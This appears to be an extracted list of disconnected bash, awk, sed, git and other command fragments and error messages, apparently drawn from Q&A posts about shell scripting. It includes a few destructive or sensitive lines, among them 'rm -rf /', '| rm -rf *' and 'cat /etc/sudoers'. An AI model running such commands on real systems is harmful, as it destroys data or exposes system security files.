Bad substitution
bash 4.1+
sort | uniq
sudo killall java
ps ax | grep "java"
egrep -v "eclipse"
grep -v
jps -l
awk 'END{print int(NR/2)}' file_name
awk '{print $0 > ("output"i+1".csv")}!(NR%4){i++}' file
avconv -i http://8273.live.streamtheworld.com:3690/WQHTFMAAC_SC -f wav -ac 1 -ar 22050 - | sudo ./pifm -
top | grep
. ./script.sh
source script.sh
echo foo | while read x; do stuff; done
while read ...
if grep -Fxq (<cache clustered=)false( ) confg.xml
if grep -Fxq (<cache clustered=(false) ) confg.xml
M-! ls
(setq shell-command-switch "-ic")
--rcfile .aliases
--rcfile .bashrc.emacs
#include "my.hpp"
sed 's/#include "my.hpp"'//
tac | sed 's/^\(#include .*\)$/\1\n#include "my.hpp"/q' | tac
Symfony 2
setfacl --help
sudo myProgram.py
grep -i 'grep2'
> /dev/null
sort -n
which sh
set disable-completion
somecommand | python mypythonscript.py
somecommand | ./mypythonscript.py
soxi -D *mp3
soxi -D *mp3 | python sum_durations.py
soxi -D *mp3
while read
read file
find ... -print0
array = ls /home/user/DIRECTORY
array[1] == 'b'
array = ls /home/user/DIRECTORY
cat {magic file/path}
ps ax
bash /some/script/sh
cat /proc/12345/fd/255
sh -c
ssh server cd /failed/path
sh -c
ssh <server> <cmd1> && ssh <server> <cmd2>
echo yay
sleep 100 && echo yay
echo yay &
bash -c
echo yay &
sh -c
sh -c exit 1
User lost connection
cp2dir filename dir1/ dir2/ dir3/
cat <inputfile> | tee <outputfile> <outputfile> <outputfile>
cut -d\
shopt -s nullglob
| grep ...
ls -1 | grep '\-tomcat\-' | cut -f3 -d'-'
ls -1 | awk -F. '/-tomcat-/ {print $1}'
ls -1 | awk -F\- '/tomcat/ {print substr($3,0,6)}'
print "something"
sed -i "" "s/{% url \([A-Za-z0-9_]*\) /{% url '\1' /g"
exit 0
exit 0
local $/
perl -pe 's#\\verbatiminput{(.*?)}#local $/;open(F,"<$1");join(q(),q(\begin{verbatim}"),<F>,q(\end{verbatim})#ge'
grep --color=auto
grep pattern1 file|grep pattern2|grep pattern3
awk '/pattern1/&&/pattern2'
grep pattern1 file|grep pattern2|grep pattern3|grep -E "pattern1|pattern2|pattern3"
shell script/function
Awk color text
This line ends here
man ssh_config
cp, find/remove, and rm -r bak
myscript.sh /data/test
set -o pipefail
doc dir
line 4: [: foo_123: binary operator expected
(ok='0' && echo ggg)
/usr/bin/env ruby
/usr/bin/env ruby
man 5 crontab
od -c
/* @@LICENSE_HEADER@@ */
@@@LICENSE NUMBER@@@
sed -e $'/\/\* @@LICENSE_HEADER@@ \*\//{r license\n;d;}' file.c
grep -o 'th[0-9]*' file
GNU awk
awk '/define host/ {for(i=1; i<=5; i++) {getline; print}}' filename
define host
svn info /path/to/svn
svn info http://svnserver/path/to/svn
./download somefile
cat filename | ./download
&> /dev/null
echo -E '\0'
ip addr show
ip addr show dev eth0 | awk '$1=="inet" {print $2}'
sh rename.sh
man find
file_exists "$1"
| sort | uniq
echo $LINE | cut -d"|" -f1
while read
04 logout
echo -n "Enter a number : "; read a
Enter a number : ww
expr: non-numeric argument
2> /dev/null
&> file
eval $CMD
read < <(cmd)
cmd | read
[ ... && ... ]
[[ ... && ... ]]
dos2unix yourscript.sh
heroku run bash
URL="sub.domain.tld"; mysql ...
mysql ...
export URL="sub.domain.tld"; mysql ...
URL="sub.domain.tld" mysql ...
mysql ... "... https://${URL}/ ..."
kill(bkgrnds[num], SIGCONT);
... sells sea ...... by the sea .....
s/\([Ss]h\.*\)[^\. ]
run param1 param2 ....
0.8.5 => 085
set -x
“dot space dot slash”
find ~/me/ -maxdepth 1 -type d -not -name "test1" -and -not -name "test4"
find ~/me/ -maxdepth 1 -type d -not -name "test1" -and -not -name "test4" | xargs rm -rf
-mindepth 1
man bash
./scriptTwo.sh $variableOne
./scriptTwo.sh "${array[@]}"
ls -l
grep ^d
awk '{print $9}'
perl -pe 's/(.*)/\1.py/g'
echo $BASH_VERSION
bash --version
MyScipt.ksh[10]: [-f:  not found
if [-f $file && $variable -lt 1] ; then
if block
type [
echo >> targets.csv
date +%Y-%m-%d
unix> ls MyFile1.yyyy-mm-dd*
Date +%Y%m%d
unix> ls MyFile2.yyyymmdd*
echo "Line $line"
bash 5.1.4(1)-release
GNU/Debian Linux 11.2
date -d ’1 day ago’ +’%Y/%m/%d’
date: illegal option -- d
unix> uname -a
SunOS Server 5.10 Generic_147440-19 sun4v sparc SUNW,Sun-Fire-T200
unix> date --version
GNU coreutils
date -v -1d
date -v +1d
exit $RC
sudo rpm -ivh jdk-7u17-linux-x64.rpm
sudo rpm -ivh jdk-7u17-linux-x64.rpm
elif[: command not found
elif[: command not found
default value
( time echo "hello" ) 2>>output.txt
date --help
2013 04 16 11 03 17 728
split, dd
apt-get upgrade
apt-get dist-upgrade
apt-get dist-upgrade
awk '{print $x}'
substr($0, 0, RSTART - 1)
git clone
echo $PS1
\007 \033
error message
bash 4.0
git log $file --oneline
git log --name-only
tar xvf - ./ | gzip > ../archive.tar.gz
tar xvf - {path_to_dir_you_want_to_compress_files_from} | gzip > archive.tar.gz
df -h
df -h | awk '{print $1 $4}'
man ssh
grep -n 'pattern' file
line number:line contents
cut -d':' -f1
sort -n
head -1
tail -1
export -f foo
. script.sh
sed -i '$firstMachineLineNum,$lastMachinesPortNumLineNum$d' file.ini
tblred -d';' -su -c'avg1_col=avg(col1),avg_col2=avg(col2)' somefile00001.csv
$mails=2013-04-16 11:57:14 1US8Fq-0001VC-Uu <= from@domain.com H=reverse.trace.of.ipaddress (server) [xxx.xxx.xxx.xxx]:PORT I=[xxx.xxx.xxx.xxx]:PORT P=esmtp S=5964 id=SOMEIDHERE$@com T="EMAILSUBJECT" from <from@domain.com> for to@domain.com
read -r
eval paste -d, $(printf "<(cut -d, -f2 %s) " *.csv)
sort -t: -nk2 | head -n 1
sort -t: -nrk2 | head -n 1
UNIX> cd My\Folder\
My\Folder> MyScript
find $source -name '*.c' | xargs gcc <files> $output
rm -rf
man 1 rm
-type f
-type d
rm -rf
mysql -h$DB_HOST -u $DB_USER -p$DB_PASS $DB_NAME --skip-column-names --default-character-set=UTF8  -e "here is a query" | while read "here is getting variables from recordset";
while true
$name =~ s/\.url$//;
read database_path
[ -f "$database_path" ]
[ -f "$database_path" ]
[ -f $database_path ]
PS1='\u@\h:\[\e[01;34m\] \[$(pwd|sed -e "s!.*/\\([^/]*/[^/]*/[^/]*\\)!\\1!g")\] \[\e[00m\] \[\e[01;31m\]\t\[\e[00m\]\$ '
me@my-computer two/three/four 12:01:37$
replace (a|b|c|d) with \n + (same character as before)
chmod +x test.bash
o=$o" "$(basename $i)
o="${o} $(basename $i)"
which source
type source
> outfile
sed 's/find/replace/'
sed 's/find/replace/g'
vboxmanage showvminfo
vboxmanage guestproperty enumerate
grep -o
$( customerArray )
"backup.sh has been executed"
Process Substitution
echo "test" >(wc)
echo test
echo "test"
echo "test" /dev/fd/63
sed -f chunk
SP2-0310: unable to open file "MyScript2.sql"
DIR="$1" || '.'
DIR="$1" || '.'
GNU awk
pcoip_agent -info
echo -e "\t\t\033[4;41m Welcome to Internal Messaging System \033[0;0m"
$ sh menu_sys.sh |  write 680613
^[[4;41m Welcome to Internal Messaging System^[[0;0m
write 680613 < somefile
tr -s 'field'
grep -nre  '^\<go.gle.com\>
grep -nre '^\<go\.gle\.com\>' file
matching pattern
any character
fixed string match
awk's index function
timeout 5 tee /tmp/mypipe <<< "1" > /dev/null
ACCESS EXCLUSIVE
-P format=unaligned
set -o pipefail
man bash
for file in $InputDir'*'
assign "/home/XXX/*" to $file
echo $file
set -x
phase scripts
mkdir ${CLIENT_BUILD_DIR}
man find
-mtime 0
sort -r
| more
find /var -name "*.php" -mtime -1 -ls
tail -f myfifo
foo > mfifo
tail -f
tail -f
ls your/dir/path/here > your/file/path/here
grep -o ti
grep tick
>(grep -o ti)
grep tick
grep i
sleep 1
( )
sed -i "s/location_apache/$CUSTOM_INSTALL_HOME/g" $apache_boing
uname -a
< /dev/null
read -u3
Page: #####
awk 'BEGIN{i=0;} /pattern/ {i=1;} {if(i==1) print}' file
prog > file 2>&1
parameter null or not set
sh: !1:
:h filename-modifiers
:h shellescape()
in seq
for i
find $source -name '*.c' -or -name '*.cpp' -execdir gcc {} -o $output \;
cmd bar baz ...
1 2 3
1 2 3
2 3
sort -kN.M
: command not found ping.sh: line 9: syntax error near unexpected token etc.
[ $1 == "-all" ]
for ((host=1; host<100; host++))
'-bash: __git_ps1: command not found'
man bash
exec('cd ..')
echo exec('pwd')
cd ..
cd ..
SHELL := /bin/bash
help read
echo "Removed ("$a"/"$b")."
10k * 10k
trap "kill $!" SIGTERM SIGINT
/bin/bash -c fswebcam -d /dev/video0 /home/pi/image.jpg
shopt -s nullglob; ls *.unmatchedextension
git merge
git merge --ff-only
[0 - 1]
ls -1 | grep jboss |sed -r 's/^.*-([0-9.]+)\..*/\1/'
[ ... ]
[[ ... ]]
(( ... ))
[[ ... ]]
while read
tail | while
env ruby
sed -n '/^((/,/^))/ { /^((/b; /^))/b; p }'
< p>
<p >
grep -Eo "<li type=\"square\">-?(\w+)</li>" ./*
string number_of_reps
A => 4, C => 2
C => 4, B => 2
$regex => 2, $fh => 4
ps -e -o %cpu
None of the specified ports are installed.
port installed abc
[[ ]]
eval $1="${array[selid]}"
eval doctype="${array[selid]}"
trap 0
myscript -u -m -p
script.pl < /tmp/a
touch note.txt
VAR="#ErrorLog \"logs/error_log\""
VAR="$VAR"$'\n'"ErrorLog \"|<apache_location>/bin/rotatelogs <apache_location>/logs/error.%Y.%m.%d.log 86400\""
replace="ErrorLog \"logs/error_log\""
sed -i "s;$replace;$VAR;g" /root/daniel/scripts/test3/httpd.conf
sudo /etc/init.d/gdm restart
perlbrew use ...
rm -rf
perlbrew switch ...
perlbrew switch ...
source ~/perl5/perlbrew/etc/bashrc
date %H
date +%H
[ `date +%u` -lt 6
cd /home && ls
DocumentRoot /var/www
DocumentRoot /var/www/mysite.com/public_html
sudo sed -i 's/'DocumentRoot /var/www'/'DocumentRoot /var/www/mysite.com/public_html'/' /etc/apache2/sites-available/mysite.com
sed: -e expression #1, char 14: unterminated s command
sed 's/hi/hey/
sed 's#hi#hey#'
temp=$(echo $str|awk '{split($0,array,":")} END{print array[1]}')
chmod 777 /tmp
host 12.34.56.78
HOST or IP or whatever
\( ... \)
ps axf
open("/dev/null", O_RDWR)
open("/home/you/output.txt", O_RDWR)
display -version
grep -o '\.[^.]*$'
sed 's/.*\././'
ps -o pid,c -u $user --no-headers
PID  C
$2 > 0
{ top = top ' ' $1 }
END {
cin >> command
while(cin >> command)
#!/usr/bin/env bash
grep -q
grep -q
grep -q
man grep
GRANT ALL ON *.* TO 'root'@'localhost'
read variable
'[ ]'
make test
shopt -s extglob
if [ -n "$BASH_ENV" ]; then . "$BASH_ENV"; fi
set -x
nohup python *.py &
kill -3 pid
killall python
pkill -P <parent>
pkill -P <parent>
kill -15 18054
ps aux | grep -e 'python spam.py' | grep -v grep | awk '{print $2}' | xargs -i kill {}
getent passwd userid
getent group groupid
getent group
--date 'today 00:00:00'
GNU sed
GNU grep
grep (GNU grep) 2.25
g001.jpg with g002.jpg, g002.jpg, g004.jpg
> <
smbget  -u user -p password smb://host/share/file
perl -pi...
ls -l dir1/
ls -l dir1/ dir2/
man dd
usage: command not found
cd $dropzone || exit 1
declare -A hash
for file in ./
condition expected: read
[[ ]]
[ ]
xsh /util/getopts/extra
-type f
-printf '%C@ %P\n'
| sort -n
| cut -d' ' -f2-
| head -n -2
xargs rm
xargs rm -f
(NR<=3 && !/^#/)
ps -ax
ps -axww | grep -w -c 'sqlplus'
grep -w -c 'sqlplus'
rm foo
rm command
tail -f
grep -c
too many arguments
make G=wget
sed 's/ - .*//'
c/program files (x86)/java/jre7
c/program files (x86)/java/jre7
$myjava=cat c/program\ files\ (x86)/java/jre7
export JAVA_HOME=myjava
JAVA_HOME=$myjava; export JAVA_HOME
echo "${files[@]}
2 a
<div class='hello'>...</div>
$S == $T
"$S" == "$T"
$S == $T
"$S" == "$T"
Red Hat Enterprise Linux Server release 5.4
netstat -tnpl | grep "tcp" | awk '{print $4}'
ip_port=`netstat -tnpl | grep "tcp" | awk '{print $4}'` && echo $ip_port
echo "$VARbar"
awk '{$(NF-1)=$NF;NF--}1' FS='/' OFS='/'
grep -c
GNU awk
bzcat file.csv.bz2 | cut -f2 -d";" | sort -n | head -2
bzcat file.csv.bz2 | cut -f2 -d";" | sort -n | tail -1
lsmod | grep ath
export ARRAY_POS=""
stop the parent from a child
tell to parent - need stop
kill -SIGUSR1 $(ps $$ -o ppid=);exit
set -e
screen -X -S csgo -p 0 stuff say test
./csgo.sh RCON say test
-X: stuff: invalid option "say"
screen -X -S csgo -p 0 stuff \"$2\"
"this is a new block"
trap exit_handler EXIT
source b.sh
set -f
set +f
crontab -e
ps -ef | grep cron
/etc/init.d/cron start
>/dev/null 2>&1
cd /home/script-owner
source .bashrc
man cron
find / ${CRITERIA}
./findscript -name "*.c"
./findscript "-name \"*.c\""
./script -a -b -c -d -- -name ".cpp" -o -name ".hpp"
./script -a -b -c -d -f "*.cpp" -f "*.hpp"
find | while
$ alias
security list-keychains
security create-keychain -p foo appledev
grep -oE "string[0-9]" file.log >> results.csv
permission denied
date \"+%Y%m%d\"
timeout 2 head
| rm -rf *
man 5 crontab
env VAR=[value] [script-command]
-o /dev/null
$(echo "$mLine" | sed -e "s/.*${l_bound}//;s/${r_bound}.*//")
sudo crontab -e
*/10 * * * * /usr/local/bin/zfs_scrub.sh
zpool list -H -o name
1 to 9
a to z
A to Z
git add
git commit
git status
git clone local/project/dir newdir
man sed
export JAVA_HOME=$(readlink -f /usr/bin/java | sed "s:bin/java::")
exit 0
gs -dBATCH ...
expr match "234can't find" 'c'
expr match "234can't find" '^c'
man rmdir
man rm
-f -r
rmdir /q /s Temp
while ... case ... shift
rm -rf /
SED: Permission error
curl -JLO "https://github.com/tada/pljava/archive/V1_6_2.zip"
echo "$PDF
find "$DIRECTORY" -name "*.pdf" -exec grep "palindrom"
\; -print
[[ ]]
[( )]
man test
read -p
for loop
200 >
x=$(echo $x + $step|bc)
mimosa watch -s &
kill -s USR1 0
kill -s USR1 0
trap 'echo ignoring' USR1 USR2
set -m
ssh -t kitty@133.33.22.1 "sudo nohup bash -c \"kill -9 \\\`ps -ef | grep 'udp_receiver' | grep -v 'grep' | awk '{print \\\$2}'\\\` > /nohup.out 2>&1 &\""
syntax error
watch du
pv testfile > copy/testfile
rsync --progress testfile copy/
gem install watchr
$ watchr -v
$ /usr/bin/watchr -e 'watch(./hello.txt) ...'
which watchr
find /usr/local/bin ! -lname '../Cellar/*'
ssh …
GNU bash, version 4.1.2(1)-release (x86_64-redhat-linux-gnu)
find -printf
man uniq
man sort
price * quantity
exit 1
<?php echo 'Hi'; ?>
echo 'foo'
<?php ... ?>
sudo visudo
sudo whoami
cat /etc/sudoers
set -x
set -x
set -x
set -x
man bash
mkdir ~/$(printf "%s" `date +"%Y%m%d%H%M%S"`)
for f in file*.txt; do nucmer --mum $f second.txt; show-snps -Clr -x 2 out.delta > out_${f%.txt}.snps; done
while (<>) { }
while (<>) { while (<>) { } }
cat file.txt|
main.memory=-min50m -max1024m
set -- $OPTS
swi prolog
txt_bold "This is bold" "And this in plain text"
set -u
set -o nounset
[ "$foo" -eq "$foo" ]
busybox' ash
tail +n
marker point
./zf.sh: line 16: application/views/scripts/foo/foo.phtml: No such file or directory
touch application/views/scripts/"${theFile}"/$(echo ${theFile} | tr '[:upper:]' '[:lower:]').phtml
nohup bash -i <fifoin >fifoout 2>&1 &
ps -e
bash -i
rm -rf $filename;
rm -rf $filename;
PLAT_SCRIPT := /path/to/script.sh
PLAT_VAR := VAR
PLAT_SCRIPT_TEXT := $(shell grep ${PLAT_VAR} ${PLAT_SCRIPT}) VAR := $(filter-out ${PLAT_VAR}, $(strip $(subst =, , $(subst ",, $(strip ${PLAT_SCRIPT_TEXT})))))
VAR := $(shell echo $(PLAT_SCRIPT_TEXT)|cut -d, -f1|awk -F'=' '{print $2 }' )
Domain_List=( "abc.com" "google.com" .... "yahoo.com")
source Doamin.txt
python run.py 2>&1 | pygmentize -l py
python run.py 2>&1
download (1)
| tee screen.out
"DRI_PRIME=1 glxspheres"
git commit -m "CurrentBranchName"
git commit
git commit
stat -c '%a %n' *
$(cat $responsefile)
date -r <timestamp_in_seconds_with_no_fractions>
4241 - 4240 - 1 = 0
4248 - 4244 - 1 = 3
4259 - 4256 - 1 = 2
$(( ... ))
$(( ... ))
awk '!a[$0]++'
awk '($0 in a) {a[$0]; print}'
read -u 3
Exception ... ignored
except IOError
Exception ... ignored
Exception ... ignored
Exception ... ignored
layout asm
your-program.py | less
date -d "1986-01-01"
date -d "1986-01-02"
date -d "1987-01-01"
date -d "1986-01-01"
[ $x ]
echo "Do something with $x"
while read
read -r
awk '$0~/xyz/{ //your code goes here}' abc.txt
shell_exec('php /path/to/del_user.php username');
shell_exec('userdel '.$argv[1]);
shell_exec('userdel '.$username);
$ ffmpeg -i "ScreeningSchedule-1.mov" -y "test.mp4" 2>&1 | tr '\r' '\n'
$ ffmpeg -i "ScreeningSchedule-1.mov" -y "test.mp4" 2>&1 | tr '\r' '\n'>log.txt
$ # ffmpeg -i "ScreeningSchedule-1.mov" -y "test.mp4" 2>&1 | sed 's/\\r/\\n/'
tail -f
foo=54 /tmp/foobar
bar=/var/tmp /tmp/foobar
my Pass
set -x
tail -f stm.err | grep ERROR > error.log &
/ PASSED / { total += $4 }
END { print total }
tail -f /access/log
grep "/index.php"
sed -u
-type d
-type f
(-path ./source/script AND -prune)
(-type f AND -print)
`(-path ./source/script AND -prune)
funky $(returnSomething)
echo foo
parse.sh -a -b VALUE
sed -n '93,109p' start-loader
command not found
man bash
man uniq
tr -s ' '
cat foo.txt | gawk '{ printf $0 }'
kill -SIGINT pid
bash -x
BEGIN{ }
export foo="bar"
alias foo=bar
export x="a b"
sed "s/Foo*\ //g"
adb push myfile //mnt/sdcard
echo $r | od -c
echo "yes" | command
echo "yes" | python manage.py flush
yes yes | python manage.py flush
python manage.py flush --no-input
echo yes
mkdir -p
mkdir -p
my_sub_dom=$( sed 's/=.*//' weekly.txt )
sort -r -k2
-r -k2
foo line
echo $n1 + $n2 | bc
$(echo '$a')
uname -s
find .
-name "*.jar"
sh -c
jar -tf {}
jar -tf
--label {}
jar -tf
exit 0
exit 1
[[ ... ]]
[[ $var -eq 0 ]]
|| exit
exit 1
$var -eq 0 && ...
: ;
program "${args[@]}"
array=("${array[@]}" value)
command | while ... done
while ... done < <(command)
exiftool **/*.{mp3,flac}
'exit 1'
ls -al
diff this that | awk '/^>/{print "/add/this/path/" $2}' | xargs -i cp {} /to/somewhere/else
bash: /dev/null: ambiguous redirect
2> /dev/null
python331/bin/pip No such file or directory
find . -type d
find . -type d | grep -v ./.
find . -type d | grep -v '^\./\.'
find . -type d | grep -v '/\.'
hg pull
hg up
echo '/home/ke/Desktop/b/o/r/files.txt:am.torrent' | sed -e 's+/++g' -e 's/^.*Desktop//' -e 's/files.txt:.*$//'
#!/usr/bin/env bash
#!/usr/bin/env NAME
/usr/bin/env awk -f
/usr/bin/env -S
#!/usr/bin/env bash
#!/usr/bin/env bash
#!/usr/bin/env <interpreter> <arg>
<interpreter> <arg>
<interpreter> <arg>
#!/usr/bin/env bash
#!/usr/bin/env xxx
sed '$ { /^$/ d}' days.txt
head -c -N
man truncate
truncate -s -1 file_name.txt
ls -R
-type f
-exec md5 {} \;
&& [ ! -L "$DIR/$x" ]
|| echo $SPACING $x
viewpdf ~/pdf/test.pdf
viewpdf t
ls ~/pdf/*.pdf
export PATH="$PATH":~/bin
join <(sort FILE1) <(sort FILE2)
GNU sed
some command
dd bs=1
truss -eaf /usr/bin/perl -e printf "Test\n"; sleep 5
/usr/bin/perl -e printf "Test\n"; sleep 5
dd bs=1
wc -l
some command
tail -f
tail -f
GNU awk
ls -l
ls -l > info.txt
cat info.txt | cut -d'' -f6
-f 6
stat -c %s *
stat -c "%s %n" *
find ... -print0
xargs -0
-type d
Output = 1
yum install ant
ant -diagnostics
ant -diagnostics
export ANT_HOME=/usr/share/ant
chmod +x /usr/share/ant/lib/salesforce-jar
chown root:root /usr/share/ant/lib/salesforce-jar
ant -lib /usr/share/ant/lib/salesforce-jar retrieve ...
ant -lib /usr/share/ant/lib retrieve ...
export PATH=$PATH:$ANT_HOME/bin
find / -iname "*.jpg" -print
fdupes -r -d /home/$USER
ln -s "/path/to the/original image.jpg" "_path_to the_original image.jpg"
... | xargs ./script
git config --global alias.
git alias
git cfg
git config --global
git hist
git cfg
git cfg alias.
git alias
git $(echo 'cfg')
git cfg
git alias st status
git st
git status
git $(echo 'cfg')
[ $# = 2 ]
ls -l
ls -l
ls -l
cat file | sort
LC_ALL= $x
YYYY-MM-DD HH:MM
sudo periodic daily weekly monthly
#!/usr/bin/env bash
awk '/^\(t:\)/{if(++c <= 200){print >> "outfile1"}else{print >> "outfile2"}}' infile
> or <
$2>=somevalue1 && $2<= somevalue2
c d
e f
rm -rf
sort -n
sort -n
awk ' { if($2 == "required") {sub("required","sufficient");} print }' filename
grep -E "[ ]*(wt\^|p\^)" <file>
wget --cookies=on --save-cookies=site.txt URL
wget --cookies=on --keep-session-cookies --load-cookies=site.txt URL
Resource temporarily unavailable
 find . | grep png | something sed | sort | uniq > indentifiers.txt 
multidiff index.html 2 3 4
multiDiffSeq index.html 2 4
multiDiff index.html 2 3 4
cat io
cat Settings
read PathToLaunchers
cat $pathToFiles
xcrun -sdk iphoneos Validation -online -upload /path/to/ipa
xcrun -sdk iphoneos Validation -upload /path/to/ipa
$var if $var is defined and otherwise "default"
if $var is defined use "value"; otherwise nothing
set -u
awk 'BEGIN {fout="file1";} /wt/{i++}i==3{fout="file2";} {print $0 > fout}' <filename>
-f <fmt>
"2016-02-22 20:22:14"
brew update
brew install bash
chsh -s /usr/local/bin/bash
<Combined_season>2</Combined_season>  <EpisodeNumber>8</EpisodeNumber>
sort -rnk2
mplayer -fs -fixed-vo thats_marvellous.mp4 cliff.mp4
^ ERROR
grep ^ \
ERROR' '
"^ ERROR"
alias ferr='grep -E "^ERROR"'
[bash]$ ferr <filename>
./run.sh first 10
kill -s SIGKILL -- -gpid
kill -s SIGKILL
kill -s KILL
-w 1
rm -r -f
0|1|2|3|4|5|6|7|8|9 )
cat cmd_file | parallel
( cd /var/www/www.foo.net/ ; git pull )
tail -f
-n +0
find /home/foo/ -name bar
find /home/foo/ -name '*bar*'
echo $(( 10 /5 *200 ))
-exec cp
afplay some.mp3
say -v Alex "message"
gvim --echo-wid
gvim --echo-wid
eval "$(SHELL=/bin/sh lesspipe)"
SHELL=/bin/sh lesspipe
export SHELL=/bin/sh lesspipe
adminaccount# /usr/local/bin/ReasonScript.sh
root# /usr/local/bin/ReasonScript.sh
root# sudo -u adminaccount /usr/local/bin/ReasonScript.sh
\[\e]0;\u@\h: \w\a\]
`echo "$@" | grep -q -- "--nohup"
nohup $0 "$@" --nohup &
`echo "$@" | grep -q -- "--nohup"
nohup bash -c "source .functions; function1" &
man timeout
.otf .ttf
cat ~/Desktop/fontList.txt | while IFS= read -r f; do f2=$(sed 's/[][*?\]/\\&/g' <<< "$f"); find /Users/Shared/DesignFonts -type f \( -name "$f2" -o -name "$f2.*" \) -exec cp {} ~/Desktop/fontPot \;; done
shopt -s globstar extglob; cat ~/Desktop/fontList.txt | while IFS= read -r f; do cp /Users/Shared/DesignFonts/**/"$f"?(.*) ~/Desktop/fontPot; done
killed: 9
make test
killed: 9
Invalid date. Please enter the correct format
if [[ || ]]
if [ ] || [ ]
sed -i ''
$SHELL -c
size=$(du -s ${files[$item]} | awk '{printf $1}')
for item in  ${!files[*]}; do
find "$path" -type f | while read file
find "$path" -type f
find "$path" -type f -ls
blh blah
blh blah
:set ff=unix
perl -pi -e "s/\r/\n/g;" <file>
echo '$1'
echo "\$1"
do script
if [ $? == 0 ]; then
sh filename.sh
ssh-keygen -N "" -t rsa -f ftp-rsa
bash script
exec("ssh user@web2.mydomain.com ./bash_script")
read -a
echo ${SSH_CLIENT##* }
-p [password]
-c [command]
'  '
"   "
./abc.py -p 'a!s!d!f' -c 'ifconfig'
man rename
declare -n
$(launchctl load -w /System/Library/LaunchDaemons/com.apple.auditd.plist)
sort -gk1,1
sort (GNU coreutils) 8.20
sort -g file
column -t
; then
"How many factors would you like to check total: "
jar xf jar-file archived-file(s)
jar uf jar-file input-file(s)
grep -v grep
diff -qr /path1 /path2
bash <<< "$cmd"
echo "$cmd" | bash
bash -c "$cmd"
wc -c
wc -c
wc -c
wc -c
wc -c <file
wc -c
. test.sh
#!/usr/bin/env bash
./myscript -h
-p any_string
man bash
[ ]
cut -f4
cut -f4 file
cut -f <<<"$string"
{print "
{print "'"$0}
awk -f foo file
awk '{print "\047"$0}' file
awk -v q=\' '{print q$0}' file
awk '{print "'\''"$0}' file
'{print "'
svn log URL --stop-on-copy
svn log URL --xml
svn log
egrep -i
x=".."; svn log ... sed '...'
--limit 10
svn log
--limit 10
svn log URL --search STRING
info bash
declare -A arr
2 3
0 1
a[2][3] = 3
(r * col_size) + c)
11 234 567.89
3,8,13,18,23,28,33,38,43,48 * * * * foo.sh
"+ ..."
Mar 21 15:41
ls -l
display the last modification time of FILE
sed 's/hello/bye/g a' replaces all ocurrencies of
in the file
sed -i
echo "Retrying in five seconds"; sleep 5
while [[condition]]; do true; done
echo ${Iliad[@]}
$vol_name+="( "$page_name" )"
(-F"," -v OFS="','")
(print quote $0 quote)
"$(eval "$COM1")"
and i can't run
xxd build_oem.sh
./build_oem.sh: line 4: ^M: command not found
csvcc <ee-content.csv
wc -l
Google indexing
About 17,000,000 results
google that
google that
last argument of the last command
google's query
last argument of the last command
google some weird search
open something something_other
-a applcation
[ $foo == 'bar' ]
[ "$foo" = 'bar' ]
[[ "$foo" == 'bar' ]]
[ $1 == '' ]
[ -z "$1" ]
date -d '9:00 GMT'
readlink -f <relative_path_to_file>
2>&1 |
for (( year = ${year_start}; year <=${year_end}; year++ ))
sleep --help
cp precious.db pre_test.db
rm pretest.db
var1 and var2
awk -F ',' '$2 ~ /^ *[0-9]*(\.[0-9]+)?" *$/{sub(/"/, "\n", $2);}' sample.txt > out.txt
7' 4" to 10' 3-1/2",7' 4" to 10' 3-1/2"
Adjustable from 99" to 111" - max 148,Adjustable from 99" to 111" - max 148
7' 4" to 10' 3-1/2",
Adjustable from 99" to 111" - max 148,
[0, i+1)
i+1 == size
awk -vvstr="$(echo {1..10000})" -f /path/to/a.awk
autosort f
sort f
chmod a+x mapper.py
if grep -q 1920x1080
grep -o
[ -z "$line" ]
${arr_pos[0]} + 1
for + case ... esac
find / f1 -exec ls -l {} \;
{} \;
sh -c
sh -c
arg0 arg1 arg2
sh -c
ffprobe "$0" ....
sh -c
set +o histexpand
node /var/node/assets/js/update.js
-d' '
if [ $step -ge 1 ] && [ $step -le 52 ]
if [ "$step" -ge 1 -a "$step" -le 52 ]
if [[ "$step" -eq 0 ]]
if [ "$step" -eq 0 ]
example.sh: line 2: [: -eq: unary operator expected
if [ "$x" -eq 0 ]
example.sh: line 2: [: : integer expression expected
if [[ .... ]]
example.sh: line 2: [: =: unary operator expected
if [ "$x" = "name"  ]
file -i *.csv
for f in *; do cp "$f" "$f"_copy; done
script nameOfLog.txt
exec >>log_file 2>&1
find "$directory" -name "*.sh" -print0 | xargs -0 cp -t ~/bckup
echo $fin_size
$( ... )
foo 1998
foo 80817
cd foo 1998
cd foo 80817
source script.sh
. script.sh
db2 activate db <your db>
exec(command, args)
args = {this.scriptName, mailTo, subject, message}
John Doe            : Crocodiles    : 1035
sort /r /+39 file
cat $t
for t in $TESTS_PATH1/cmd*.in; do
$parser_test <$t
[[ $? == 0 ]]
[ $? -eq 0 ]
1> $TMP_FILE 2> $TMP_FILE
1>$TMP_FILE 2>&1
if command; then ...
0 0
echo "$pseed"
done < $USER
input redirection
chmod +x FILENAME.sh
chmod u+x FILENAME.sh
bash foo
#!/usr/bin/env bash
chmod u+x MigrateNshell.sh
/bin/bash -c
npm: command not found
nvm use 0.10.10
which node
which npm
nvm use <version>
date -d
date -d
cp $(find "$directory" -type f | grep -iE '\.(c|cc|cpp|cxx)$') ~/src
's_f_r_;/f/r/; ... \/find\/replace\/'
comm -2 file1.txt file2.txt
grep -v 'pattern' file
grep 'pattern' file
grep -v 'foo' bar.txt | wc -l
grep 'foo' bar.txt | wc -l
$1 == "Thread" { h[$1" "$2]++ } ...
wc -l
wc -l
-bash: unknown_command: command not found
bash: unknown_command: command not found
bash -login
command not found
git status
man bash
a_dbg.txt, b_dbg.txt ...
Suse 10
rename _dbg.txt .txt *dbg*
-dp -1
-ssf '_dbg'
-rs '/_dbg//'
find -execdir rename
sort -r
find . -depth | rename -d -v -n "s/ /_/g"
d=$(echo "((2 * $t) + 1) / $e" | bc)
man bash
[[ $- = *i* ]]
read -t
read -t 3
GNU grep
Wed Jan 16 10:15:04 2013
strftime("your format here")
command tablename prefix
cp -sR /some/directory/maps/* /some/directory/cars/
date +%s%N
echo $(($(date +%s%N)/1000000))
date +%s
date +"%T.%N"
date +"%T.%6N"
date +"%T.%3N"
man date
date +%s%N
brew install coreutils
the_time = gettimeofday()
echo $EPOCHREALTIME
date +%s000
runtime 2.3
tr -d '\n' <pg2600.txt > output.txt
./script.sh > file
( ./script.sh ) | more
ls -a
process substitution
sh file.sh
bash file.sh
sh file.sh
/bin/bash file.sh
od -t x1
help eval
printf %q
evil_code #
-d ''
one to n
key=value otherkey=othervalue etc=etc
declare -n
declare -n
dynamic "2 3"
./search.sh dir1 dir2
echo {a[!b]*,[!a.]?*}
